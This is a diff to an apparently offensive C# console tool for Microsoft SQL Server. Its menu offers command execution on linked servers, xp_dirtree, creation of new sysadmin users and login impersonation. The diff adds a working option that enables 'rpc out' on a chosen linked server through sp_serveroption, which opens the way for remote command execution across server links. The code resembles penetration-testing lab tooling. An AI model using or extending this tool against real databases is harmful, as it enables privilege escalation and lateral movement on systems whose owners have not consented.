@@ -91,7 +91,8 @@ namespace SQL
                     Console.WriteLine("\t" + "3. Execute command on a linked server (EXEC AT LinkedServer)");
                     Console.WriteLine("\t" + "4. Perform xp_dirtree");
                     Console.WriteLine("\t" + "5. Create new sysadmin user (local/remote)");
-                    Console.WriteLine("\t" + "6. Pull login-mapping and execute commands on linked server.\n");
+                    Console.WriteLine("\t" + "6. Pull login-mapping and execute commands on linked server.");
+                    Console.WriteLine("\t" + "7. Enable RPCOUT on linked server.\n");
                     Console.Write("[+] Enter 1, 2,3,4,5 or 6: ");
                     string choice = Console.ReadLine();
 
@@ -242,6 +243,32 @@ namespace SQL
                         }
                     }
 
+                    if (choice == "7")
+                    {
+                        // Display a list of linked servers
+                        List<string> linkedServers = ListLinkedServers(con);
+                        Console.WriteLine("\nSelect a linked server to enable RPCOUT:" + "\n");
+
+                        for (int i = 0; i < linkedServers.Count; i++)
+                        {
+                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}\n");
+                        }
+
+                        Console.Write("[+] Enter the number of the linked server: ");
+                        int serverChoice = int.Parse(Console.ReadLine()) - 1;
+
+                        if (serverChoice >= 0 && serverChoice < linkedServers.Count)
+                        {
+                            string selectedServer = linkedServers[serverChoice];
+                            EnableRpcOut(con, selectedServer);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] Invalid choice.");
+                        }
+                    }
+
+
                     if (choice == "6")
                     {
                         // Display list of logins to impersonate
@@ -314,16 +341,6 @@ namespace SQL
 
                         }
 
-                }
-
-
-
-
-
-
-                    else
-                    {
-                        Console.WriteLine("[!] Invalid choice. Please enter 1, 2, 3, 4, 5 or 6.");
                     }
 
                 }
@@ -341,6 +358,23 @@ namespace SQL
                     con.Close();
                     Console.WriteLine("Connection closed.");
                 }
+            }
+        }
+
+        static void EnableRpcOut(SqlConnection con, string serverName)
+        {
+            try
+            {
+                // Query to enable RPCOUT on the specified server
+                string enableRpcOutCmd = $"EXEC sp_serveroption @server = '{serverName}', @optname = 'rpc out', @optvalue = 'true';";
+                SqlCommand enableCommand = new SqlCommand(enableRpcOutCmd, con);
+                enableCommand.ExecuteNonQuery();
+
+                Console.WriteLine($"[+] Enabled RPCOUT on server: {serverName}\n");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Error enabling RPCOUT on server {serverName}: " + ex.Message);
             }
         }
 
